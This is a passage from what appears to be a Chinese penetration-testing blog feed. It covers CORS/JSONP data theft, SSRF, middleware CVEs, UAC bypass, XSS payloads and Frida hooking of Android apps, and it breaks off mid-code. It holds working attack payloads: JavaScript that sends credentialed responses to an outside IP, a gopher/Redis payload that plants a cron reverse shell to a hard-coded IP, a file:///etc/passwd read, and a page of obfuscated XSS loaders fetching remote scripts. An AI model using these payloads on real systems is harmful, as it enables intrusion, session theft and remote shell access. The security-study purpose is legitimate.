</span></span><br><span class="line"><span class="javascript">req.onload = reqListener; </span></span><br><span class="line"><span class="javascript">req.open(<span class="string">&#x27;get&#x27;</span>,<span class="string">&#x27;http://127.0.0.1:8082/DoraBox/csrf/userinfo.php&#x27;</span>,<span class="literal">true</span>);</span></span><br><span class="line"><span class="javascript"><span class="comment">//req.setRequestHeader(&quot;Content-Type&quot;,&quot;application/x-www-form-urlencoded;&quot;); </span></span></span><br><span class="line"><span class="javascript">req.withCredentials = <span class="literal">true</span>;</span></span><br><span class="line"><span class="javascript">req.send();</span></span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">reqListener</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">                <span class="keyword">new</span> Image().src=<span class="string">&quot;http://101.34.185.252:10002/&quot;</span> + <span class="built_in">window</span>.btoa(<span class="built_in">unescape</span>(<span class="built_in">encodeURIComponent</span>(<span class="built_in">JSON</span>.stringify(req.responseText))))</span></span><br><span class="line"><span class="javascript">&#125;;</span></span><br><span class="line"><span class="javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="Jsonp"><a href="#Jsonp" class="headerlink" title="Jsonp"></a>Jsonp</h4><p>jsonp的原理就是利用就是利用<code>script</code>标签没有跨域限制，可以通过<code>script</code>标签的src属性发送<code>GET</code>请求,JSONP只支持GET请求。</p><p><strong>判断</strong></p><p>必须有callback信息回显,前后端约定一个callback字段名，来传递函数名，前端通过该函数来拿到数据。</p><p><code>callback=aaaa    aaaa(&#123;json含有敏感信息&#125;)</code></p><p><strong>利用</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>JSONP EXP跨域测试<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params">json</span>)</span>&#123;</span></span><br><span class="line"><span class="javascript"><span class="keyword">new</span> Image().src=<span class="string">&quot;http://127.0.0.1:10002/&quot;</span> + <span class="built_in">JSON</span>.stringify(json)</span></span><br><span class="line"><span class="javascript"><span class="comment">//alert(JSON.stringify(json))</span></span></span><br><span class="line"><span class="javascript">&#125;</span></span><br><span class="line"><span class="javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;http://127.0.0.1:8082/csrf/jsonp.php?callback=test&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h2><p>服务端请求伪造（Server Side Request Forgery, SSRF）指的是攻击者在未能取得服务器所有权限时，利用服务器漏洞以服务器的身份发送一条构造好的请求给服务器所在内网,特点是突出<strong>网络访问</strong>。SSRF攻击通常针对外部网络无法直接访问的内部系统</p><p>SSRF涉及到的危险函数主要是<strong>网络访问</strong>，支持伪协议的<strong>网络读取</strong>。以PHP为例，涉及到的函数有 <code>file_get_contents()</code> / <code>fsockopen()</code> / <code>curl_exec()</code> 等</p><p><strong>危害</strong></p><p>SSRF可以对外网、服务器所在内网、本地进行端口扫描，攻击运行在内网或本地的应用，或者利用File协议读取本地文件。</p><p><strong>利用</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">file:///etc/passwd</span><br><span class="line"></span><br><span class="line">gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0a*/1 * * * * bash -i &gt;&amp; /dev/tcp/103.21.140.84/6789 0&gt;&amp;1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a</span><br></pre></td></tr></table></figure><p>gopher是一个互联网上使用的分布型的文件搜集获取网络协议.可以利用它构造post数据包发送TCP数据流,tcp70端口,如果发起post请求，回车换行需要使用%0d%0a，如果多个参数，参数之间的&amp;也需要进行URL编码,gopher协议是ssrf利用中最强大的协议.</p><p>gopher -ssrf payload 生成脚本:<a href="https://github.com/xmsec/redis-ssrf">https://github.com/xmsec/redis-ssrf</a></p><p>参考:<a href="https://websec.readthedocs.io/zh/latest/vuln/index.html">https://websec.readthedocs.io/zh/latest/vuln/index.html</a></p><h2 id="中间件漏洞"><a href="#中间件漏洞" class="headerlink" title="中间件漏洞"></a>中间件漏洞</h2><p><strong>tomcat</strong><br>默认端口:8080<br>1.弱口令 &amp;&amp; 后台getshell漏洞,上传war包<br>2.Tomcat PUT方法任意写文件漏洞（CVE-2017-12615）<br>3.Tomcat AJP 文件包含漏洞（CVE-2020-1938）</p><p><strong>jboss</strong><br>默认端口:8080<br>1.JBoss JMXInvokerServlet 反序列化漏洞<br>2.JBoss 5.x/6.x 反序列化漏洞（CVE-2017-12149）<br>3.JBoss 4.x JBossMQ JMS 反序列化漏洞（CVE-2017-7504）<br><strong>weblogic</strong><br>默认端口:7001<br>1.Weblogic &lt; 10.3.6 ‘wls-wsat’ XMLDecoder 反序列化漏洞（CVE-2017-10271）<br>2.Weblogic WLS Core Components 反序列化命令执行漏洞（CVE-2018-2628）<br>3.Weblogic 任意文件上传漏洞（CVE-2018-2894）后台<br>4.Weblogic 管理控制台未授权远程命令执行漏洞（CVE-2020-14882，CVE-2020-14883）<br>5.Weblogic SSRF漏洞</p>]]></content>
      
      
      
        <tags>
            
            <tag> web渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows提权</title>
      <link href="/posts/57748/"/>
      <url>/posts/57748/</url>
      
        <content type="html"><![CDATA[<h2 id="正在编辑"><a href="#正在编辑" class="headerlink" title="正在编辑~~~~~~"></a>正在编辑~~~~~~</h2><p>BYpass UAC</p><p>CVE-2019-1388 </p><p>对应补丁 KB4525235 KB4525233 </p><p>场景:常见图形化界面 UAC提权 线下常见的终端大屏设备</p>]]></content>
      
      
      
        <tags>
            
            <tag> 提权 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>常用xss payload</title>
      <link href="/posts/28218/"/>
      <url>/posts/28218/</url>
      
        <content type="html"><![CDATA[<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1&quot;&gt;</span><br><span class="line">    &lt;title&gt;&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">    &lt;h1&gt;hello&amp;nbsp;&amp;nbsp;&amp;nbsp;world&amp;nbsp;&amp;nbsp;&amp;nbsp;!&lt;/h1&gt;</span><br><span class="line"></span><br><span class="line">    &lt;sCRiPt sRC=https://hk.sb/71gN&gt;&lt;/sCrIpT&gt;</span><br><span class="line"></span><br><span class="line">    &lt;script&gt;</span><br><span class="line"></span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">    // document.write(String.fromCharCode(60,115,67,82,105,80,116,32,115,82,67,61,47,47,120,115,115,56,46,99,99,47,104,82,51,65,62,60,47,115,67,114,73,112,84,62))</span><br><span class="line"></span><br><span class="line">    &lt;/script&gt;</span><br><span class="line"></span><br><span class="line">    &lt;!-- &lt;script language=&quot;javascript&quot;&gt;alert(1)&lt;/script&gt; --&gt;</span><br><span class="line"></span><br><span class="line">    &lt;!-- &lt;script src=//192.168.21.66/x&gt;&lt;/script&gt;   --&gt;</span><br><span class="line">    &lt;!-- html标签 --&gt;</span><br><span class="line"></span><br><span class="line">    &lt;!-- &lt;input id=&quot;xxx&quot; type=&quot;text&quot; onclick=&quot;js代码&quot;&gt; --&gt;</span><br><span class="line"></span><br><span class="line">    &lt;!-- &lt;details ontoggle=eval(&quot;s=document.createElement(&#x27;script&#x27;);s.src=&#x27;//192.168.21.66/x&#x27;;document.body.appendChild(s);&quot;) open=&gt;&lt;/details&gt; --&gt;</span><br><span class="line"></span><br><span class="line">    &lt;!-- &lt;img src=&quot;x&quot; onerror=eval(atob(&#x27;cz1kb2N1bWVudC5jcmVhdGVFbGVtZW50KCdzY3JpcHQnKTtzLnNyYz0nLy8xOTIuMTY4LjIxLjY2L3gnO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQocyk7&#x27;)) style=&quot;display: none;&quot;&gt; --&gt;</span><br><span class="line"></span><br><span class="line">    &lt;!-- &lt;img src=&quot;x&quot; onerror=&quot;alert(7)&quot; style=&quot;display: none;&quot;&gt; --&gt;</span><br><span class="line">    &lt;!-- &lt;img src=&quot;https://www.baidu.com/img/flexible/logo/pc/result.png&quot; onload=&quot;alert(7)&quot; style=&quot;display: none;&quot;&gt; --&gt;</span><br><span class="line"></span><br><span class="line">    &lt;!-- &lt;svg onload=&quot;s=document.createElement(&#x27;script&#x27;);s.src=&#x27;//192.168.21.66/x&#x27;;document.body.appendChild(s);&quot; display=none&gt; --&gt;</span><br><span class="line"></span><br><span class="line">    &lt;!-- &lt;svg/onload=eval(atob(&#x27;cz1kb2N1bWVudC5jcmVhdGVFbGVtZW50KCdzY3JpcHQnKTtzLnNyYz0nLy8xOTIuMTY4LjIxLjY2L3gnO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQocyk7&#x27;)) display=none&gt;&lt;/svg&gt; --&gt;</span><br><span class="line"></span><br><span class="line">    &lt;!-- &lt;iframe src=&quot;javascript:alert(4)&quot; display=&gt;&lt;/iframe&gt; --&gt;</span><br><span class="line"></span><br><span class="line">    &lt;!-- &lt;a href=&quot;javascript:alert(5)&quot;&gt;a&lt;/a&gt; --&gt;</span><br><span class="line"></span><br><span class="line">    &lt;!-- &lt;script src=//192.168.21.66/x&quot;&gt;</span><br><span class="line">    </span><br><span class="line">    &lt;details ontoggle</span><br><span class="line">    =console.log(1) open=&gt;&lt;/details&gt; --&gt;</span><br><span class="line"></span><br><span class="line">    &lt;!-- &lt;input type=&quot;text&quot; class=&quot;iptSearch-a&quot; value=&quot;123&quot;&gt;&lt;script src=//192.168.21.66/x&quot; name=&quot;Search&quot; placeholder=&quot;请输入关键字搜索&quot;&gt; --&gt;</span><br><span class="line"></span><br><span class="line">    &lt;!-- &lt;input type=&quot;text&quot; class=&quot;iptSearch-a&quot; value=&quot;123&quot; onclick=&quot;eval(atob(&#x27;cz1kb2N1bWVudC5jcmVhdGVFbGVtZW50KCdzY3JpcHQnKTtzLnNyYz0nLy8xOTIuMTY4LjIxLjY2L3gnO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQocyk7&#x27;))&quot; name=&quot;Search&quot; placeholder=&quot;请输入关键字搜索&quot;&gt; --&gt;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> xss </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用Frida简化Android端应用安全测试</title>
      <link href="/posts/13084/"/>
      <url>/posts/13084/</url>
      
        <content type="html"><![CDATA[<h1 id="使用Frida简化Android端应用安全测试"><a href="#使用Frida简化Android端应用安全测试" class="headerlink" title="使用Frida简化Android端应用安全测试"></a>使用Frida简化Android端应用安全测试</h1><p>@author : Dlive</p><p>在对Android应用进行Web漏洞测试时，经常遇到一种情况：HTTP传输的数据带有签名字段</p><p>处理这种情况的方法通常是逆向签名算法，但是如果算法在so中，而且so加壳了，想要逆向出算法也要花很大一番功夫</p><p>还有就是可以自己编写app调用so里的签名算法，然后对HTTP传输的数据进行测试</p><p>这两种方法都挺麻烦的，并且如果一个app中多处使用了不同的签名/加密算法就更麻烦了</p><p>曾经想写一个Android上的代理软件，在Android手机上开启HTTP/HTTPS代理，在PC端将HTTP/HTTPS流量交给代理，代理软件调用so里的加密/签名算法，</p><p>最后代理软件将经签名/加密后的数据提交给服务端。这样的话就可以直接用SQLmap之类的工具进行测试了。</p><p>但是在我准备着手写这么个东西之前，我发现了个更方便的东西：Frida，使用Frida我们可以较简便地解决上面所说的问题。</p><p>这里以一些Demo为例讲解Frida如何简化Android端应用的安全测试。</p><p>同时2017 TSCTF的一道Web+Android APP题目为例，讲解如何使用Firda简化移动端的Web安全测试。(毕竟Web🐶，关注点主要在Web…</p><h2 id="0x01-Frida介绍"><a href="#0x01-Frida介绍" class="headerlink" title="0x01 Frida介绍"></a>0x01 Frida介绍</h2><p>Frida是一个动态代码插桩工具，它可以让你向多种平台（Windows, Linux, macOS, IOS, Android, QUX）的App插入自定义Javascript代码片段</p><p>它可以做什么</p><ul><li>Access process memory</li><li>Overwrite functions while the application is running</li><li>Call functions from imported classes</li><li>Find object instances on the heap and use them</li><li>Hook, trace and intercept functions etc.</li></ul><h2 id="0x02-安装Firda"><a href="#0x02-安装Firda" class="headerlink" title="0x02 安装Firda"></a>0x02 安装Firda</h2><p>以Mac为例，其他系统请自行查看Firda官方文档</p><p>环境：Python3 ，Root过的Nexus 4(Android 4.4)</p><blockquote><p>Frida官方文档说需要Python3.x的环境，因为Firda最开始是基于Android 4.4开发的，所以建议使用4.4或4.4以上版本的系统</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo pip3 install frida</span><br></pre></td></tr></table></figure><p>验证是否安装成功</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ frida --version</span><br><span class="line"><span class="number">9.1</span>.<span class="number">20</span></span><br></pre></td></tr></table></figure><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ python3</span><br><span class="line">Python <span class="number">3.6</span><span class="number">.0</span> (<span class="keyword">default</span>, Dec <span class="number">24</span> <span class="number">2016</span>, <span class="number">08</span>:<span class="number">01</span>:<span class="number">42</span>) </span><br><span class="line">[GCC <span class="number">4.2</span><span class="number">.1</span> Compatible Apple LLVM <span class="number">8.0</span><span class="number">.0</span> (clang<span class="number">-800.0</span><span class="number">.42</span><span class="number">.1</span>)] <span class="keyword">on</span> darwin</span><br><span class="line"><span class="built_in">Type</span> <span class="string">&quot;help&quot;</span>, <span class="string">&quot;copyright&quot;</span>, <span class="string">&quot;credits&quot;</span> or <span class="string">&quot;license&quot;</span> <span class="keyword">for</span> more information.</span><br><span class="line">&gt;&gt;&gt; <span class="keyword">import</span> frida</span><br><span class="line">&gt;&gt;&gt; </span><br></pre></td></tr></table></figure><p>下载和frida对应版本的frida-server (<a href="https://links.jianshu.com/go?to=https://github.com/frida/frida/releases">https://github.com/frida/frida/releases</a> )，解压后将frida-server push到Android中</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ adb push ~/0Android/frida/frida-server-9.1.20-android-arm /data/<span class="built_in">local</span>/tmp/frida-server</span><br><span class="line">/Users/dlive/0Android/frida/frida-serv...d. 3.5 MB/s (21555488 bytes <span class="keyword">in</span> 5.948s)</span><br></pre></td></tr></table></figure><p>在adb shell中运行frida-server</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root<span class="variable">@android</span><span class="symbol">:/data/local/tmp</span> <span class="comment"># chmod 755 frida-server</span></span><br><span class="line">root<span class="variable">@android</span><span class="symbol">:/data/local/tmp</span> <span class="comment"># ./frida-server &amp;</span></span><br></pre></td></tr></table></figure><h2 id="0x03-Frida相关命令的基本使用"><a href="#0x03-Frida相关命令的基本使用" class="headerlink" title="0x03 Frida相关命令的基本使用"></a>0x03 Frida相关命令的基本使用</h2><blockquote><p>经测试发现很多情况下frida非常不稳定，可以选择重启frida-server后重新执行命令</p></blockquote><p>开启端口转发</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">adb forward tcp:<span class="number">27042</span> tcp:<span class="number">27042</span></span><br><span class="line">adb forward tcp:<span class="number">27043</span> tcp:<span class="number">27043</span></span><br></pre></td></tr></table></figure><h3 id="1-frida-ps"><a href="#1-frida-ps" class="headerlink" title="1.frida-ps"></a>1.frida-ps</h3><p>查看正在运行的进程</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Connect Frida to an iPad over USB and list running processes </span></span><br><span class="line"><span class="comment"># -U connect to USB device</span></span><br><span class="line"><span class="variable">$ </span>frida-ps -U </span><br><span class="line"></span><br><span class="line"><span class="comment"># List running applications </span></span><br><span class="line"><span class="variable">$ </span>frida-ps -Ua </span><br><span class="line"></span><br><span class="line"><span class="comment"># List installed applications </span></span><br><span class="line"><span class="variable">$ </span>frida-ps -Uai</span><br></pre></td></tr></table></figure><h3 id="2-frida-trace"><a href="#2-frida-trace" class="headerlink" title="2.frida-trace"></a>2.frida-trace</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 显示open()函数的调用情况</span></span><br><span class="line">frida-trace -i <span class="string">&quot;open&quot;</span> -U com.android.chrome</span><br><span class="line"></span><br><span class="line"><span class="comment"># -f 让Frida启动chrome app (let Frida spawn the process)</span></span><br><span class="line">frida-trace -i <span class="string">&quot;open&quot;</span> -U -f com.android.chrome</span><br></pre></td></tr></table></figure><h3 id="3-frida"><a href="#3-frida" class="headerlink" title="3.frida"></a>3.frida</h3><p>frida交互式命令行界面(详细请参考官方文档)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Unfortunately, in my case it always lead to getting the app killed automatically after 2 seconds. </span></span><br><span class="line"><span class="comment"># This is not what we want. You can either use these 2 seconds to type %resume</span></span><br><span class="line">frida -U -f com.android.chrome</span><br><span class="line"></span><br><span class="line"><span class="comment"># better command</span></span><br><span class="line"><span class="comment"># --no-pause automatically start main thread after startup</span></span><br><span class="line">frida -U --no-pause -f com.android.chrome</span><br><span class="line"></span><br><span class="line"><span class="comment"># pass the -f option to Frida to let it spawn the process itself</span></span><br><span class="line">frida -U --no-pause -f com.android.chrome  </span><br><span class="line"></span><br><span class="line"><span class="comment"># 向app注入JS</span></span><br><span class="line">frida -U -l example.js com.example.dlive</span><br></pre></td></tr></table></figure><p>注入的JS和之后Python中用到的JS的用法相同</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;[*] Starting script&quot;</span>);</span><br><span class="line"></span><br><span class="line">Java.perform(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">var</span> Activity = Java.use(<span class="string">&quot;android.app.Activity&quot;</span>);</span><br><span class="line"></span><br><span class="line">    Activity.onResume.implementation = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;[*] onResume() got called!&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">this</span>.onResume();</span><br><span class="line"></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h2 id="0x04-使用Frida进行Hook"><a href="#0x04-使用Frida进行Hook" class="headerlink" title="0x04 使用Frida进行Hook"></a>0x04 使用Frida进行Hook</h2><h3 id="1-Hook-Native层"><a href="#1-Hook-Native层" class="headerlink" title="1. Hook Native层"></a>1. Hook Native层</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> frida</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">rdev = frida.get_remote_device()</span><br><span class="line">session = rdev.attach(<span class="string">&quot;com.tencent.mm&quot;</span>)</span><br><span class="line">scr = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Interceptor.attach(Module.findExportByName(&quot;libc.so&quot; , &quot;open&quot;), &#123;</span></span><br><span class="line"><span class="string">    onEnter: function(args) &#123;</span></span><br><span class="line"><span class="string">        send(&quot;open(&quot;+Memory.readCString(args[0])+&quot;,&quot;+args[1]+&quot;)&quot;);</span></span><br><span class="line"><span class="string">    &#125;,</span></span><br><span class="line"><span class="string">    onLeave:function(retval)&#123;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">&#125;);</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">script = session.create_script(scr)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">on_message</span>(<span class="params">message ,data</span>):</span></span><br><span class="line">    <span class="built_in">print</span> message</span><br><span class="line">script.on(<span class="string">&quot;message&quot;</span> , on_message)</span><br><span class="line">script.load()</span><br><span class="line">sys.stdin.read()</span><br></pre></td></tr></table></figure><h3 id="2-Hook-Java层"><a href="#2-Hook-Java层" class="headerlink" title="2. Hook Java层"></a>2. Hook Java层</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> frida</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">rdev = frida.get_remote_device()</span><br><span class="line">session = rdev.attach(<span class="string">&quot;com.tencent.mm&quot;</span>)</span><br><span class="line"></span><br><span class="line">scr = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Java.perform(function () &#123;</span></span><br><span class="line"><span class="string">var ay = Java.use(&quot;com.tencent.mm.sdk.platformtools.ay&quot;);</span></span><br><span class="line"><span class="string">ay.pu.implementation = function()&#123;</span></span><br><span class="line"><span class="string">    var type = arguments[0];</span></span><br><span class="line"><span class="string">    send(&quot;type=&quot;+type);</span></span><br><span class="line"><span class="string">    if (type == 2)</span></span><br><span class="line"><span class="string">    &#123;</span></span><br><span class="line"><span class="string">        return this.pu(type);</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    else</span></span><br><span class="line"><span class="string">    &#123;</span></span><br><span class="line"><span class="string">        return 5;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">&#125;;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#125;);</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">script = session.create_script(scr)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">on_message</span>(<span class="params">message ,data</span>):</span></span><br><span class="line">    <span class="built_in">print</span> message</span><br><span class="line">script.on(<span class="string">&quot;message&quot;</span> , on_message)</span><br><span class="line">script.load()</span><br><span class="line">sys.stdin.read()</span><br></pre></td></tr></table></figure><h2 id="0x05-使用Frida-Python接口结合Flask实现APP中转注入"><a href="#0x05-使用Frida-Python接口结合Flask实现APP中转注入" class="headerlink" title="0x05 使用Frida Python接口结合Flask实现APP中转注入"></a>0x05 使用Frida Python接口结合Flask实现APP中转注入</h2><p>apk只有一个登陆功能，该功能的username字段存在注入</p><p>apk中调用了native方法对username和password签名, 签名之后得到的sign和username, password一起发往服务端</p><p>使用Flask写如下中转脚本，接收username和password, 计算sign</p><p>经测试Frida频繁向app进程注入JS容易挂掉。。。如果挂掉重启app就好，然后让sqlmap继续原来的session</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span 